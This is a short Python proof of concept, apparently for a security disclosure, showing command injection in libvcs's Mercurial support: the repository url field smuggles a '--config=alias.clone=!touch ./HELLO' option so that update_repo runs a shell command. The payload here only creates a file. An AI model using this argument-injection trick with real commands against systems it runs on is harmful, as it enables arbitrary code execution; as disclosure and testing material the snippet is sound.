from libvcs.shortcuts import create_repo 

# Vulnerable code allowing command injection
r = create_repo(url='--config=alias.clone=!touch ./HELLO', vcs='hg', repo_dir='./') 

r.update_repo()